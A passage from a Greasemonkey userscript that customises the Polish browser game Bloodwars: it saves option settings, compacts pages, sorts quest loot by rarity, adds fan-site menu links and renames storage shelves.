      GM_setValue(id + 'UM_OP_ark6', this.checked);
    }, false);
    document.getElementById('UM_OP_ark13').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_ark13', this.checked);
    }, false);
    document.getElementById('UM_OP_ark3').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_ark3', this.checked);
    }, false);
    document.getElementById('UM_OP_ark5').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_ark5', this.checked);
    }, false);
    document.getElementById('UM_OP_ark7').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_ark7', this.checked);
    }, false);
    document.getElementById('UM_OP_ark8').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_ark8', this.checked);
    }, false);
    document.getElementById('UM_OP_ark9').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_ark9', this.checked);
    }, false);
    document.getElementById('UM_OP_ark2').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_ark2', this.checked);
    }, false);
    document.getElementById('UM_OP_ark1').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_ark1', this.checked);
    }, false);
    document.getElementById('UM_OP_epickie').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_epickie', this.checked);
    }, false);
    document.getElementById('UM_OP_legendarne').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_legendarne', this.checked);
    }, false);
    document.getElementById('UM_OP_youtube').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_youtube', this.checked);
    }, false);
    document.getElementById('UM_OP_shoutboxclan').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_shoutboxclan', this.checked);
    }, false);
    document.getElementById('UM_OP_donesound').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_donesound', this.checked);
    }, false);
    document.getElementById('UM_OP_clansound').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_clansound', this.checked);
    }, false);
    document.getElementById('UM_OP_globalsound').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_globalsound', this.checked);
    }, false);
    document.getElementById('UM_OP_unmodon').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_unmodon', this.checked);
    }, false);
              /* czapka */
		document.getElementById('UM_OP_questItemListOn').addEventListener('click', function () {
		  GM_setValue(id + 'UM_OP_questItemListOn', this.checked);
		}, false);

    document.getElementById('UM_OP_shop1').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_shop1', this.checked);
    }, false);
    document.getElementById('UM_OP_ukryj').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_ukryj', this.checked);
    }, false);
    document.getElementById('UM_OP_ukryj2').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_ukryj2', this.checked);
    }, false);
    document.getElementById('UM_OP_zkkrew').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_zkkrew', this.checked);
    }, false);
    document.getElementById('UM_OP_notify').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_notify', this.checked);
    }, false);
    document.getElementById('UM_OP_mysort').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_mysort', this.checked);
    }, false);
    document.getElementById('UM_OP_mysort1').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_mysort1', this.checked);
    }, false);
    document.getElementById('UM_OP_mysort2').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_mysort2', this.checked);
    }, false);
    document.getElementById('UM_OP_mysort3').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_mysort3', this.checked);
    }, false);
    document.getElementById('UM_OP_taximax').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_taximax', this.checked);
    }, false);
    document.getElementById('UM_OP_fastzk').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_fastzk', this.checked);
    }, false);
    document.getElementById('UM_OP_alarm').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_alarm', this.checked);
    }, false);
    document.getElementById('UM_OP_alarm_h').addEventListener('change', function () {
      GM_setValue(id + 'UM_OP_alarm_h', this.value);
    }, false);
    document.getElementById('UM_OP_alarm_m').addEventListener('change', function () {
      GM_setValue(id + 'UM_OP_alarm_m', this.value);
    }, false);
    document.getElementById('UM_OP_jednoraz1').addEventListener('change', function () {
      GM_setValue(id + 'UM_OP_jednoraz1tier', this.options[this.selectedIndex].getAttribute('data-tier'));
      GM_setValue(id + 'UM_OP_jednoraz1', this.value);
    }, false);
    document.getElementById('UM_OP_jednoraz2').addEventListener('change', function () {
      GM_setValue(id + 'UM_OP_jednoraz2tier', this.options[this.selectedIndex].getAttribute('data-tier'));
      GM_setValue(id + 'UM_OP_jednoraz2', this.value);
    }, false);
    document.getElementById('UM_OP_polki').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_polki', this.checked);
    }, false);
    document.getElementById('UM_OP_skroty').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_skroty', this.checked);
    }, false);
    document.getElementById('UM_OP_wyparch').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_wyparch', this.checked);
    }, false);
    document.getElementById('UM_OP_spiszk').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_spiszk', this.checked);
    }, false);
    document.getElementById('UM_OP_linkluck').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_linkluck', this.checked);
    }, false);
    document.getElementById('UM_OP_taxilev').addEventListener('change', function () {
      GM_setValue(id + 'UM_OP_taxilev', this.value);
    }, false);
    document.getElementById('UM_OP_key_0').addEventListener('change', function () {
      GM_setValue(id + 'UM_OP_key_0', this.value);
    }, false);
    document.getElementById('UM_OP_key_1').addEventListener('change', function () {
      GM_setValue(id + 'UM_OP_key_1', this.value);
    }, false);
    document.getElementById('UM_OP_key_2').addEventListener('change', function () {
      GM_setValue(id + 'UM_OP_key_2', this.value);
    }, false);
    document.getElementById('UM_OP_key_3').addEventListener('change', function () {
      GM_setValue(id + 'UM_OP_key_3', this.value);
    }, false);
    document.getElementById('UM_OP_key_4').addEventListener('change', function () {
      GM_setValue(id + 'UM_OP_key_4', this.value);
    }, false);
    document.getElementById('UM_OP_key_5').addEventListener('change', function () {
      GM_setValue(id + 'UM_OP_key_5', this.value);
    }, false);
    document.getElementById('UM_OP_key_6').addEventListener('change', function () {
      GM_setValue(id + 'UM_OP_key_6', this.value);
    }, false);
    document.getElementById('UM_OP_key_7').addEventListener('change', function () {
      GM_setValue(id + 'UM_OP_key_7', this.value);
    }, false);
    document.getElementById('UM_OP_key_8').addEventListener('change', function () {
      GM_setValue(id + 'UM_OP_key_8', this.value);
    }, false);
    document.getElementById('UM_OP_key_9').addEventListener('change', function () {
      GM_setValue(id + 'UM_OP_key_9', this.value);
    }, false);
    document.getElementById('UM_OP_key_0').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_key_0', this.value);
    }, false);
    document.getElementById('UM_OP_key_1').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_key_1', this.value);
    }, false);
    document.getElementById('UM_OP_key_2').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_key_2', this.value);
    }, false);
    document.getElementById('UM_OP_key_3').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_key_3', this.value);
    }, false);
    document.getElementById('UM_OP_key_4').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_key_4', this.value);
    }, false);
    document.getElementById('UM_OP_key_5').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_key_5', this.value);
    }, false);
    document.getElementById('UM_OP_key_6').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_key_6', this.value);
    }, false);
    document.getElementById('UM_OP_key_7').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_key_7', this.value);
    }, false);
    document.getElementById('UM_OP_key_8').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_key_8', this.value);
    }, false);
    document.getElementById('UM_OP_key_9').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_key_9', this.value);
    }, false);
    document.getElementById('UM_OP_polka1').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_polka1', this.value);
    }, false);
    document.getElementById('UM_OP_polka2').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_polka2', this.value);
    }, false);
    document.getElementById('UM_OP_polka3').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_polka3', this.value);
    }, false);
    document.getElementById('UM_OP_polka4').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_polka4', this.value);
    }, false);
    document.getElementById('UM_OP_polka5').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_polka5', this.value);
    }, false);
    document.getElementById('UM_OP_polka6').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_polka6', this.value);
    }, false);
    document.getElementById('UM_OP_polka7').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_polka7', this.value);
    }, false);
    document.getElementById('UM_OP_polka8').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_polka8', this.value);
    }, false);
    document.getElementById('UM_OP_polka9').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_polka9', this.value);
    }, false);
    document.getElementById('UM_OP_polka10').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_OP_polka10', this.value);
    }, false);
    document.getElementById('UM_urlsound').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_urlsound', this.value);
    }, false);
    document.getElementById('UM_urlsound').addEventListener('change', function () {
      GM_setValue(id + 'UM_urlsound', this.value);
    }, false);
    document.getElementById('UM_urlclansound').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_urlclansound', this.value);
    }, false);
    document.getElementById('UM_urlclansound').addEventListener('change', function () {
      GM_setValue(id + 'UM_urlclansound', this.value);
    }, false);
    document.getElementById('UM_urlglobalsound').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_urlglobalsound', this.value);
    }, false);
    document.getElementById('UM_urlglobalsound').addEventListener('change', function () {
      GM_setValue(id + 'UM_urlglobalsound', this.value);
    }, false);
    document.getElementById('UM_kolorepik').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_kolorepik', this.value);
    }, false);
    document.getElementById('UM_kolorlegenda').addEventListener('change', function () {
      GM_setValue(id + 'UM_kolorlegenda', this.value);
    }, false);
    document.getElementById('UM_zkclean').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_zkclean', this.value);
    }, false);
    document.getElementById('UM_trole').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_trole', this.value);
    }, false);
    document.getElementById('UM_pass').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_pass', this.value);
    }, false);
    document.getElementById('UM_zk').addEventListener('keyup', function () {
      GM_setValue(id + 'UM_zk', this.value);
    }, false);
    document.getElementById('UM_zk').addEventListener('change', function () {
      GM_setValue(id + 'UM_zk', this.value);
    }, false);
  }
  if (GM_getValue(id + 'UM_OP_unmodon', true)) {
    if (a.search('&unmod=true') != - 1) {
      function removeByClassName(id) {
        e = document.getElementsByClassName(id);
        if (e.length) {
          for (i = e.length - 1; i >= 0; i--) {
            var o = (elem = document.getElementsByClassName(id) [i]).parentNode.removeChild(elem);
          }
        }
      }
      function removeById(id) {
        return (elem = document.getElementById(id)).parentNode.removeChild(elem);
      }
      removeByClassName('itemstacked1');
      removeByClassName('itemstacked2');
      removeByClassName('hr620');
      removeByClassName('logo');
      removeByClassName('menu');
      removeByClassName('gameStats');
      removeByClassName('version');
      removeByClassName('top');
      removeByClassName('time-effects');
      removeById('sbox_icons_clan');
      removeById('sbox_icons_global');
      removeById('interiaFooter');
      removeByClassName('remark');
      removeByClassName('hr720');
      removeByClassName('copyright');
      removeByClassName('top-options');
      removeByClassName('content-bottom');
      e = document.getElementsByTagName('a');
      if (e.length) {
        for (i = 0; i < e.length; i++) {
          e[i].href = e[i].href + '&unmod=true';
        }
      }
      e = document.getElementsByClassName('main') [0];
      //		e.style.width="330px"
      e.getElementsByTagName('div') [0].style.width = '100%';
      e = document.getElementsByClassName('textarea');
      if (e.length) {
        e[0].style.width = '200px';
        e[0].style.height = '100px';
      }
      e = document.getElementById('topic');
      if (e) {
        e.style.width = '200px';
        e = document.getElementsByTagName('form') [0];
        e.action = e.action + '&unmod=true'
      }
      e = document.getElementById('content-mid');
      e.style.width = '320px';
      e.style.height = '100%';



    if (a.search('townshop') == - 1) {

      e.innerHTML = '<center><a href=\'?a=msg&unmod=true\'><button id=\'inboxreload\' style=\'margin-top:5px;\'>PRZEŁADUJ SKRZYNKĘ</button></a></center><BR/>' + e.innerHTML;
    } else {
       var o = (elem = document.getElementsByTagName('FIELDSET')[0]).parentNode.removeChild(elem);
       var o = (elem = document.getElementsByTagName('FIELDSET')[1]).parentNode.removeChild(elem);
       var o = (elem = document.getElementsByTagName('FIELDSET')[1]).parentNode.removeChild(elem);
       var o = (elem = document.getElementsByTagName('FIELDSET')[1]).parentNode.removeChild(elem);
       var o = (elem = document.getElementsByTagName('FIELDSET')[1]).parentNode.removeChild(elem);
       var o = (elem = document.getElementsByTagName('FIELDSET')[1]).parentNode.removeChild(elem);
       var o = (elem = document.getElementsByTagName('FIELDSET')[1]).parentNode.removeChild(elem);
       var o = (elem = document.getElementsByTagName('FIELDSET')[1]).parentNode.removeChild(elem);
       var o = (elem = document.getElementsByTagName('FIELDSET')[1]).parentNode.removeChild(elem);
       var o = (elem = document.getElementsByTagName('FIELDSET')[1]).parentNode.removeChild(elem);
       var o = (elem = document.getElementsByTagName('FIELDSET')[1]).parentNode.removeChild(elem);
       var o = (elem = document.getElementsByTagName('FIELDSET')[1]).parentNode.removeChild(elem);
    }

      GM_addStyle('                                         div.content-mid {                                       padding-left: 30px !important;    padding-right: 0px !important;    padding-top: 40px;    position: relative;    z-index: 1;}'
      );
      e = document.getElementsByClassName('content') [0];
      e.style.width = '320px';
      e.style.top = '-30px';
      e.style.left = '-30px';
      e = document.getElementsByClassName('msg-content');
      if (e.length) {
        e[0].style.width = '90%';
      }
      document.getElementsByTagName('body') [0].innerHTML = document.getElementsByTagName('body') [0].innerHTML.replace(/do=delall/g, 'do=dellall&unmod=true').replace('Data wysłania', 'Data')
      itemS = document.getElementsByClassName('item-link');
      for (i = 0; i < itemS.length; i++) {
        if (GM_getValue(id + 'UM_OP_legendarne', true)) {
          itemS[i].innerHTML = itemS[i].innerHTML.replace('Legendarny', '<span style="text-shadow: 2px 2px 2px black;color: ' + GM_getValue(id + 'UM_kolorlegenda', 'green') + '";>Legendarny');
          itemS[i].innerHTML = itemS[i].innerHTML.replace('Legendarna', '<span style="text-shadow: 2px 2px 2px black;color: ' + GM_getValue(id + 'UM_kolorlegenda', 'green') + '";>Legendarna');
          itemS[i].innerHTML = itemS[i].innerHTML.replace('Legendarne', '<span style="text-shadow: 2px 2px 2px black;color: ' + GM_getValue(id + 'UM_kolorlegenda', 'green') + '";>Legendarne');
        }
        if (GM_getValue(id + 'UM_OP_epickie', true)) {
          itemS[i].innerHTML = itemS[i].innerHTML.replace('Epickie', '<span style="text-shadow: 2px 2px 2px black;color: ' + GM_getValue(id + 'UM_kolorepik', 'blue') + '";>Epickie');
          itemS[i].innerHTML = itemS[i].innerHTML.replace('Epicki', '<span style="text-shadow: 2px 2px 2px black;color: ' + GM_getValue(id + 'UM_kolorepik', 'blue') + '";>Epicki');
          itemS[i].innerHTML = itemS[i].innerHTML.replace('Epicka', '<span style="text-shadow: 2px 2px 2px black;color: ' + GM_getValue(id + 'UM_kolorepik', 'blue') + '";>Epicka');
        }
      }


    if (a.search('msg&do=view') != - 1) {
      unsafeWindow.scrollTo(0,document.body.scrollHeight);

    }
    } else {


            /* czapka */
            var isQuest = function() {
                var msgContent = document.getElementsByClassName('msg-content msg-quest');
              if (msgContent.length == 0) { return false; }
                msgContent = msgContent[0];
                return msgContent.innerText.search("Próba") > -1 || msgContent.innerText.search("Test") > -1 || msgContent.innerText.search("Sprawdzian") > -1;
            }

		if (GM_getValue(id + 'UM_OP_questItemListOn', true) && a.search('msg&do=view') != - 1 && isQuest()) {
				var itemsCol = document.getElementsByClassName('item-link item-caption');
  if(itemsCol.length) {

        var itemsArr = [].slice.call( itemsCol );

				/* sortowanie */
				var sorted = [];
				var epic = [];
				var legdsk = [];
				var legdbr = [];
				var leg = [];
				var dsk = [];
				var dbr = [];
				var nrm = [];
                var rubbish = 0;
				for(var i = 0; i < itemsArr.length; i++) {


                    var rubbishRegexp = /.*\>([0-9\s]+) PLN.*/g;
                    var match = rubbishRegexp.exec(itemsArr[i].getAttribute('onclick'));
                    if (match !== null){
                        rubbish += Number(match[1].replace(" ", ""));
                    }

					if (itemsArr[i].innerText.search("Epick") > -1) { epic.push(itemsArr[i]); }
					else if (itemsArr[i].innerText.search("Legendarn") > -1) {
                        if      (itemsArr[i].innerText.search("Dosk") > -1) { legdsk.push(itemsArr[i]); }
                        else if (itemsArr[i].innerText.search("Dobr") > -1) { legdbr.push(itemsArr[i]); }
                        else                                                { leg.push(itemsArr[i]); }
                    } else {
                        if      (itemsArr[i].innerText.search("Dosk") > -1)      { dsk.push(itemsArr[i]); }
                        else if (itemsArr[i].innerText.search("Dobr") > -1)      { dbr.push(itemsArr[i]); }
                        else                                                     { nrm.push(itemsArr[i]); }
                    }
				}
				sorted = sorted.concat(epic).concat(legdsk).concat(legdbr).concat(leg).concat(dsk).concat(dbr).concat(nrm);


                if(sorted.length == 0) {
                    msgContent.innerHTML = "<div class=\"enabled\" style=\"margin: 8px;\">Nic nie weszło :(</div>";
                } else {
                    var msgContent = document.getElementsByClassName('msg-content msg-quest')[0];

                    ps = msgContent.getElementsByTagName("p");
                    var exp = 0;
                    var blood = 0;
                    for(var i = 0; i < ps.length; i++) {
                        if(ps[i].innerText.search("Zdoby") > -1) {
                            exp += parseInt(ps[i].getElementsByTagName("b")[0].innerText);
                            blood += parseInt(ps[i].getElementsByTagName("b")[1].innerText);
                        }
                    }

                    msgContent.innerHTML = "<div class=\"enabled\" style=\"margin: 8px;\">W trakcie wypraw(y) zyskano: <b>" + exp.toString() + "</b> pkt. doświadczenia.</div>";
                    msgContent.innerHTML += "<div class=\"enabled\" style=\"margin: 8px;\">W trakcie wypraw(y) zyskano: <b>" + blood.toString() + "</b> l krwi.</div>";
                    if (rubbish > 0){
                        msgContent.innerHTML += "<div class=\"enabled\" style=\"margin: 8px;\">W trakcie wypraw(y) znaleziono przedmioty o wartości: <b>" + rubbish.toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ") + "</b> PLN</div><br>";
                    }
                    msgContent.innerHTML += "<div class=\"enabled\" style=\"margin: 8px;\">W trakcie wypraw(y) znaleziono przedmiot(y):</div>";
                    var node = document.createElement("br");
                    msgContent.appendChild(node);
                    for (var i = sorted.length-1; i >=0 ; i--) {
                        msgContent.appendChild(sorted[i]);

                        var node = document.createElement("br");
                        msgContent.appendChild(node);
                    }
                }
			}
    }

      if (a.search('&eqset=') != - 1) {
        if (document.getElementsByTagName('body') [0].innerHTML.search('Operacja nie została wykonana, ponieważ został użyty nieprawidłowy link lub użyto funkcji') != - 1) {
          notification('EQ zostało zmienione!');
          z = window.location + '';
          z = z.replace('akey=', 'akey=' + unsafeWindow.accessKey + '&old=');
          window.location = z;
        }
      }      // mod notki everywhere

      x = document.createElement('span');
      x.id = 'x';
      x.style.display = 'none';
      y = document.createElement('span');
      y.id = 'y';
      y.style.display = 'none';
      document.getElementsByTagName('body') [0].appendChild(x);
      document.getElementsByTagName('body') [0].appendChild(y);
      chmurka = document.createElement('div');
      chmurka.id = 'chmurka';
      chmurka.style.display = 'none';
      chmurka.style.x = '300px';
      chmurka.style.zIndex = '30000';
      chmurka.style.position = 'fixed';
      chmurka.style.borderColor = 'white';
      chmurka.style.borderWidth = '2px';
      chmurka.style.borderStyle = 'solid';
      chmurka.style.padding = '4px';
      chmurka.style.backgroundColor = 'black';
      document.getElementsByTagName('body') [0].appendChild(chmurka);
      var scriptCode = new Array();
      scriptCode.push('\tfunction getMouseXY(e) {');
      scriptCode.push('\t\tdocument.getElementById(\'x\').innerHTML=e.clientX;');
      scriptCode.push('\t\tdocument.getElementById(\'y\').innerHTML=e.clientY+10;');
      scriptCode.push('\t}');
      scriptCode.push('\tdocument.onmousemove = getMouseXY;');
      var script = document.createElement('script');
      script.innerHTML = scriptCode.join('\n');
      scriptCode.length = 0;
      document.getElementsByTagName('head') [0].appendChild(script);
      //mod zapisy na lucka
      menu = document.getElementsByClassName('menu');
      if (menu.length > 11) {
        menu = menu[12];
        if (GM_getValue(id + 'UM_OP_linkluck', true)) menu.innerHTML += '<li class="menu"><a target=_new href="http://www.lil-it.net/bw/" class="menulink">Zapisy ZK</a>';
        if (GM_getValue(id + 'UM_OP_spiszk', true)) {
          menu.innerHTML += '<li class="menu"><a target=_new href="https://zk.nakoz.org/' + GM_getValue(id + 'UM_zk', '61672692') + '" class="menulink">Spis zbrojowni</li>';
        }
      }
      test = document.getElementsByClassName('menulink');
      for (t = 0; t < test.length; t++) {
        if (test[t].innerHTML == 'Live Chat') {
          test[t].href = 'http://webchat.quakenet.org/?channels=bloodwars';
          break;
        }
      }
      if (a == '?a=talizman') {
        cl = document.getElementsByClassName('equip') [0];
        div = cl.getElementsByTagName('div');
        for (x = 0; x < 10; x++) {
          nr = x + 1;
          d = div[x * 2].innerHTML;
          if (d.length > 150) {
            nazwa = d.substring(d.indexOf('CAPTION,') + 9);
            nazwa = nazwa.substring(0, nazwa.indexOf('CAPTION') - 2);
            GM_setValue(id + 'OP_talizman' + nr, nazwa);
          } else {
            GM_setValue(id + 'OP_talizman' + nr, false);
          }
        }
      }
      if (a == '?a=equip') {
        cl = document.getElementsByClassName('equip') [0];
        div = cl.getElementsByTagName('div');
        z = 20;
        if (div.length < 40) {
          z = 10;
        }
        for (x = 0; x < z; x++) {
          nr = x + 1;
          n = 0;
          if (x > 9) {
            n = 1;
          }
          d = div[n + 1 + x * 2].innerHTML;
          if (d.length > 150) {
            nazwa = d.substring(d.indexOf('CAPTION,') + 9);
            nazwa = nazwa.substring(0, nazwa.indexOf('CAPTION') - 2);
            GM_setValue(id + 'OP_equip' + nr, nazwa);
          } else {
            GM_setValue(id + 'OP_equip' + nr, false);
          }
        }
      }
      if (a.substring(0, 8) == '?a=equip') {
        oddaj = document.getElementsByName('armoryPutIn') [0];
if (oddaj) {
        oddaj.style.width = '70%';
        oddaj.style.float = 'left';
        div = document.createElement('div');
        div.id = 'oddajzk';
        div.innerHTML = '<div style="margin: 8px 0px 8px 0px;"><input class="button" type="button" onclick="invertSelect(box[20]); document.getElementsByName(\'armoryPutIn\')[0].click();" value="ODDAJ ZK"  style="float: right; width: 28%;"></div><br style="clear: both;"/>';
        if (oddaj.nextSibling) {
          oddaj.parentNode.insertBefore(div, oddaj.nextSibling);
        }
        else {
          oddaj.parentNode.appendChild(div);
        }        //		invertSelect(box[10]);
}
		//mod unlimited zk
        /*
	tid=new Array();
	tidn=0;
	var unlimited="<center><b>NIESKOŃCZONA PÓŁKA :-)</b></center><BR>";


var keys = cloneInto(GM_listValues(), window);
for (var val=0; val < keys.length; val++) {

if (typeof keys[val] !== "undefined")	if (keys[val].search(id+"UM_UZ_")!=-1) {

		temp_id = keys[val].replace(id+"UM_UZ_",'');
		 			unlimited+='<div class="item"><table cellspacing="0"><tr><td class="itemdesc itemshop even"><div id="back_'+temp_id+'" align="left" onclick="clk_stock(event, '+temp_id+');"><div align="center"><span class="item-link">'+GM_getValue(keys[val])+'</span></div><table cellspacing="0" cellpadding="0" style="width: 100%; border: 0px;"><tr><td width="18%"><input class="checkbox" type="checkbox" id="itemid_'+temp_id+'" name="itemid['+temp_id+']" onclick="onCheckBoxSelect(this, '+temp_id+', 63900, \''+GM_getValue(keys[val])+'\', $$(\'back_'+temp_id+'\'));" /></td><td width="70%"></td><td></td></tr></table></div></td><td align="right" width="18%"><a href="#" id="uz_'+temp_id+'" style="color:red; font-weight: bold;">-UNL.ZBR</a><br><BR><a class="enabled" href="?eq='+temp_id+'&amp;a=equip">EKWIPUJ</a></td></tr></table></div><script type="text/javascript">box[3]['+temp_id+'] = $$(\'itemid_'+temp_id+'\');</script></div>';

		 			tid[tidn++]=temp_id;
		}
	}


	if (tidn>0) {
	var sp1 = document.createElement("div");
	sp1.innerHTML = unlimited;
	var tu = document.getElementsByClassName('stashhdr')[0];
	var parentDiv = tu.parentNode;
	parentDiv.insertBefore(sp1, tu);

	for (x in tid)
		addevent_rem2(tid[x]);
	}



	items = document.getElementsByClassName('enabled');
	for (x in items) {
		var it = items[x];
		if (it.href) {
		it = it.href.toString();
			var pos = it.search("equip&eq=");
			if (pos != -1) {
				item_id = it.substring(pos+9,it.length);

				test = GM_getValue(id+'UM_UZ_'+item_id, "0");
				var sp1 = document.createElement("a");
				sp1.style.cursor="pointer";
				sp1.style.fontWeight="bold";
				var parentDiv = items[x].parentNode;
				sp1.id='UM_UZ_'+item_id;

				div = document.getElementById('back_'+item_id);
				span = div.getElementsByTagName('SPAN')[0];
				item_name = span.innerHTML.replace(' *','');
				if (test=="0") {
					sp1.innerHTML='+UNL.ZBR<br><br>';
					sp1.style.color="green";
					parentDiv.insertBefore(sp1, items[x]);
					addevent_add(item_id,item_name);
				} else {
					sp1.innerHTML='-UNL.ZBR<br><br>';
					sp1.style.color="red";
					parentDiv.insertBefore(sp1, items[x]);
					addevent_rem(item_id,item_name);
				}
			}
		}
	}
*/

        if (GM_getValue(id + 'UM_OP_polki', false)) {
          // mod wlasne nazwy polek
          sel = document.getElementById('newTab');
          options = sel.getElementsByTagName('option');
          options[0].innerHTML = GM_getValue(id + 'UM_OP_polka10', '10');
          options[1].innerHTML = GM_getValue(id + 'UM_OP_polka9', '9');
          options[2].innerHTML = GM_getValue(id + 'UM_OP_polka8', '8');
          options[3].innerHTML = GM_getValue(id + 'UM_OP_polka7', '7');
          options[4].innerHTML = GM_getValue(id + 'UM_OP_polka6', '6');
          options[5].innerHTML = GM_getValue(id + 'UM_OP_polka5', '5');
          options[6].innerHTML = GM_getValue(id + 'UM_OP_polka4', '4');
          options[7].innerHTML = GM_getValue(id + 'UM_OP_polka3', '3');
          options[8].innerHTML = GM_getValue(id + 'UM_OP_polka2', '2');
          options[9].innerHTML = GM_getValue(id + 'UM_OP_polka1', '1');
          el = document.getElementsByClassName('itemTab');
          for (l = 0; l < el.length; l++) {
            el[l].innerHTML = el[l].innerHTML.replace('Półka 10', GM_getValue(id + 'UM_OP_polka10', 'Półka 10'));
            el[l].innerHTML = el[l].innerHTML.replace('Półka 9', GM_getValue(id + 'UM_OP_polka9', 'Półka 9'));
            el[l].innerHTML = el[l].innerHTML.replace('Półka 8', GM_getValue(id + 'UM_OP_polka8', 'Półka 8'));
            el[l].innerHTML = el[l].innerHTML.replace('Półka 7', GM_getValue(id + 'UM_OP_polka7', 'Półka 7'));
            el[l].innerHTML = el[l].innerHTML.replace('Półka 6', GM_getValue(id + 'UM_OP_polka6', 'Półka 6'));
            el[l].innerHTML = el[l].innerHTML.replace('Półka 5', GM_getValue(id + 'UM_OP_polka5', 'Półka 5'));
            el[l].innerHTML = el[l].innerHTML.replace('Półka 4', GM_getValue(id + 'UM_OP_polka4', 'Półka 4'));
            el[l].innerHTML = el[l].innerHTML.replace('Półka 3', GM_getValue(id + 'UM_OP_polka3', 'Półka 3'));
            el[l].innerHTML = el[l].innerHTML.replace('Półka 2', GM_getValue(id + 'UM_OP_polka2', 'Półka 2'));
            el[l].innerHTML = el[l].innerHTML.replace('Półka 1', GM_getValue(id + 'UM_OP_polka1', 'Półka 1'));
            el[l].innerHTML = el[l].innerHTML.replace('Shelf 10', GM_getValue(id + 'UM_OP_polka10', 'Shelf 10'));
            el[l].innerHTML = el[l].innerHTML.replace('Shelf 9', GM_getValue(id + 'UM_OP_polka9', 'Shelf 9'));
            el[l].innerHTML = el[l].innerHTML.replace('Shelf 8', GM_getValue(id + 'UM_OP_polka8', 'Shelf 8'));
            el[l].innerHTML = el[l].innerHTML.replace('Shelf 7', GM_getValue(id + 'UM_OP_polka7', 'Shelf 7'));
            el[l].innerHTML = el[l].innerHTML.replace('Shelf 6', GM_getValue(id + 'UM_OP_polka6', 'Shelf 6'));
            el[l].innerHTML = el[l].innerHTML.replace('Shelf 5', GM_getValue(id + 'UM_OP_polka5', 'Shelf 5'));
            el[l].innerHTML = el[l].innerHTML.replace('Shelf 4', GM_getValue(id + 'UM_OP_polka4', 'Shelf 4'));
            el[l].innerHTML = el[l].innerHTML.replace('Shelf 3', GM_getValue(id + 'UM_OP_polka3', 'Shelf 3'));
            el[l].innerHTML = el[l].innerHTML.replace('Shelf 2', GM_getValue(id + 'UM_OP_polka2', 'Shelf 2'));
            el[l].innerHTML = el[l].innerHTML.replace('Shelf 1', GM_getValue(id + 'UM_OP_polka1', 'Shelf 1'));
            el[l].innerHTML = el[l].innerHTML.replace('Shelf 10', GM_getValue(id + 'UM_OP_polka10', 'Étagère 10'));
            el[l].innerHTML = el[l].innerHTML.replace('Shelf 9', GM_getValue(id + 'UM_OP_polka9', 'Étagère 9'));
            el[l].innerHTML = el[l].innerHTML.replace('Shelf 8', GM_getValue(id + 'UM_OP_polka8', 'Étagère 8'));
            el[l].innerHTML = el[l].innerHTML.replace('Shelf 7', GM_getValue(id + 'UM_OP_polka7', 'Étagère 7'));
            el[l].innerHTML = el[l].innerHTML.replace('Shelf 6', GM_getValue(id + 'UM_OP_polka6', 'Étagère 6'));
            el[l].innerHTML = el[l].innerHTML.replace('Shelf 5', GM_getValue(id + 'UM_OP_polka5', 'Étagère 5'));
            el[l].innerHTML = el[l].innerHTML.replace('Shelf 4', GM_getValue(id + 'UM_OP_polka4', 'Étagère 4'));
            el[l].innerHTML = el[l].innerHTML.replace('Shelf 3', GM_getValue(id + 'UM_OP_polka3', 'Étagère 3'));
